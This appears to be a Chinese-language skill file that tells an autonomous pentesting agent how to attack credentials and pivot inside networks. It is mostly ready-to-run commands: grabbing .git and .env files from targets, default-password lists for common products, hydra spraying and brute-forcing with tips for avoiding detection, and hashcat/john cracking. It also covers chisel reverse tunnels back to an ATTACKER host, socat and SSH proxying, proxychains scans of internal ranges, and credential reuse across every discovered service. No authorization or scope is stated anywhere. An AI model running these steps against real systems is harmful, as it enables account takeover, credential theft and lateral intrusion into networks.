---
name: credential-and-pivot-ops
description: 凭据攻击与内网枢红（口令爆破/喷洒、哈希破解、默认口令、凭据复用、SSH 桥与端口转发、chisel/socat/proxychains 隧道）。当意图涉及"跑密码""破解哈希""横向""内网""搭隧道"时读本 skill。
---
# 凭据攻击与枢红 Playbook

## 0. 铁律：先看锁定策略再动手

爆破前必须确认三件事，否则会打挂账号或封 IP：
1. **失败锁定策略**（5 次锁定？锁定多久？）
2. **是否存在验证码 / 速率限制 / IP 封禁**
3. **有没有等效的"低噪声"路径**（默认口令、泄露的密钥、源码里的硬编码）

低噪声优先顺序：**硬编码凭据 → 默认口令 → 已知泄露库比对 → 密码喷洒 → 定向爆破**。

## 1. 硬编码与泄露凭据（最高性价比）

```bash
# 从 JS / 配置文件 / git 里捞
grep -oiE '(password|passwd|pwd|secret|token|api[_-]?key|access[_-]?key)[^\n]{0,40}' all.js | sort -u
curl -s http://TARGET/.git/config
curl -s http://TARGET/.env
# 若 .git 可读 → 直接还原源码
git-dumper http://TARGET/.git ./repo 2>/dev/null || \
  (mkdir repo && cd repo && curl -s http://TARGET/.git/HEAD && echo "手工按 refs 拉对象")
```

## 2. 默认口令（先试这个，成本最低）

常见组合速查（用户名:密码）：
```
admin:admin  admin:admin888  admin:123456  admin:password  root:root
test:test    guest:guest    user:user     sa:sa          postgres:postgres
若依: admin/admin123    JeecgBoot: admin/123456    Jenkins: admin/admin
Nexus: admin/admin123   Grafana: admin/admin       RabbitMQ: guest/guest
Tomcat Manager: tomcat/tomcat  Weblogic: weblogic/weblogic  Zabbix: Admin/zabbix
```

## 3. 密码喷洒（比爆破安全，不易锁定）

```bash
# 一个弱口令打很多账号（而不是一个账号试很多口令）
kx hydra -L users.txt -p 'Spring2026!' TARGET http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=incorrect" -t 4 -W 2

# SSH / FTP / RDP / SMB / MySQL / Redis / MSSQL
kx hydra -L users.txt -P pass.txt ssh://TARGET -t 4
kx hydra -l admin -P pass.txt TARGET mysql
```
**降噪技巧**：`-t 1 -W 5`（慢）、换源、失败后随机停顿、避开业务高峰；只跑 3–5 个最高概率口令。

## 4. 哈希破解

```bash
# 先识别类型
kx hashid 'HASH'   # 或按长度/前缀判断：32=md5 40=sha1 60=sha512crypt($6$) 64=sha256

# hashcat 常用模式
hashcat -m 0     md5.txt  /usr/share/dirb/wordlists/big.txt   # md5
hashcat -m 1000  ntlm.txt rockyou.txt                          # NTLM
hashcat -m 1800  sha512crypt.txt rockyou.txt -O                # /etc/shadow $6$
hashcat -m 16500 jwt.txt rockyou.txt                           # JWT HS256
hashcat -m 22000 wpa.txt rockyou.txt                           # WPA（若有握手包）

# john 更省配置
john --wordlist=rockyou.txt --format=raw-md5 hash.txt
john --show hash.txt
```
> 容器内没有 rockyou 时，用 `/usr/share/dirb/wordlists/big.txt` 或自建针对性字典（公司名+年份、目标域名变体）。

## 5. 内网枢红

**前提**：容器出口是透明代理，直连内网不可信。两条路：
- **A. SSH 桥回宿主机 Kali**（推荐，`kali-toolbox` skill 详述）：把所有重扫描放 Kali 上跑
- **B. 应用层隧道**：通过已拿到的 Web RCE/SSRF 做转发

```bash
# chisel（容器内已装）——把内网端口映射回本机
# 攻击侧（本机/容器）
kx chisel client http://TARGET:8080/tunnel 8081:127.0.0.1:80
# 目标侧（若已 RCE）先把 chisel server 传上去并跑起来
./chisel server -p 8080 --reverse
# 反向：让目标把内网端口回连给我们
./chisel client ATTACKER:8080 R:9000:172.16.0.5:3306

# socat 端口转发（有 RCE 无 chisel 时的最小方案）
socat TCP-LISTEN:9000,fork TCP:127.0.0.1:6379

# SSH 动态代理（有 ssh 凭据时）
ssh -D 1080 -N -f user@TARGET
curl --socks5 127.0.0.1:1080 http://10.0.0.5/

# proxychains（已装）把任意工具塞进隧道
kx proxychains4 -q nmap -sT -Pn 10.0.0.0/24
```
**注意**：proxychains 下只能用 `-sT`（全连接）扫描，SYN 扫描不支持。

## 6. 凭据复用与横向

拿到一组凭据后，**在所有已发现的服务上全试一遍**（这是内网推进最快的方式）：
```
同一密码 → SSH / SMB / WinRM / RDP / MySQL / Redis / MSSQL / Web 后台 / 管理面板
同一密钥 → 其它主机 SSH / git 仓库 / CI
同一 token → 其它服务的 API
```
把每次成功/失败记成 fact（含服务与端口），避免重复试。

## 7. 判定与写回

- **凭据有效**：给出真实登录成功的证据（会话、返回的用户信息），**不要写明文密码到 finding 的公开字段**，写"已获取可用凭据，存放于 run 目录 xxx"。
- **隧道成立**：证明隧道另一端真的可达（`curl` 拿到内网服务的真实响应）。
- 爆破失败也要记 fact：试过哪些用户/口令集、锁定策略是什么，供规划者换策略。
